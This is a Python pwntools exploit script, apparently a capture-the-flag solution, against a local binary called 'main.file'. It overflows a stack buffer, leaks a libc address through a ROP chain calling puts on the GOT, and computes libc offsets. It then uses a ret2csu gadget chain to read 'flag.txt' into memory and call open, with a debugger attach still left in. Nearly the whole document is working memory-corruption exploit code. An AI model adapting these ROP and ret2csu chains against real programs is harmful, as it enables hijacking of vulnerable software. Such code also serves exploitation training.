from pwn import *

def exploit():
    p = process("./main.file")
    binary = ELF("./main.file")
    padding = 24
    puts_plt = 0x4010c0
    puts_got = 0x404018
    main = binary.symbols['serv']
    read_got = binary.got['read']
    # read_plt = binary.plt['read']
    pop_rdi = 0x0000000000401673
    pop_rsi_r15 = 0x0000000000401671
    ret = 0x000000000040101a
    bss = 0x0000000000404080 + 0x100
    csu_init1 = 0x000000000040166a # pop rbx
    csu_init2 = 0x0000000000401650 # mov rdx, r14
    junk = 'JUNK' * 2

    def ret2csu(func_GOT, rdi, rsi, rdx, rbx_after=0, rbp_after=0, r12_after=0, r13_after=0, r14_after=0, r15_after=0):
        ret_csu = p64(0x0)          # pop rbx
        ret_csu += p64(0x1)         # pop rbp
        ret_csu += p64(rdi)         # pop r12
        ret_csu += p64(rsi)         # pop r13
        ret_csu += p64(rdx)         # pop r14
        ret_csu += p64(func_GOT)    # pop r15
        ret_csu += p64(csu_init2)
        ret_csu += junk
        ret_csu += p64(rbx_after)
        ret_csu += p64(rbp_after)
        ret_csu += p64(r12_after)
        ret_csu += p64(r13_after)
        ret_csu += p64(r14_after)
        ret_csu += p64(r15_after)

        return ret_csu


    payload = ''
    payload += 'A' * padding
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)

    p.sendline(payload)

    p.recvuntil("now!\n")
    libc_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
    log.info("Libc leak: {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x080a30
    log.info("Libc base: {}".format(hex(libc_base)))
    libc_open = libc_base + 0x000000000008c520
    log.info("Libc open: {}".format(hex(libc_open)))
    libc_write = libc_base + 0x110250
    log.info("Libc write: {}".format(hex(libc_write)))
    syscall = p64(libc_open + 76)

    payload = ''
    payload += 'A' * padding
    payload += p64(csu_init1)
    payload += ret2csu(read_got, 0, bss, 0x300)
    payload += p64(pop_rdi)
    payload += p64(bss)
    payload += p64(pop_rsi_r15)
    payload += p64(3) * 2
    payload += p64(libc_open)
    payload += 'A' * 8
    
    p.sendline(payload)
    gdb.attach(p, 'b *0x00000000004015d7')
    p.send("flag.txt\x00")

    p.interactive()

if __name__ == "__main__":
    exploit()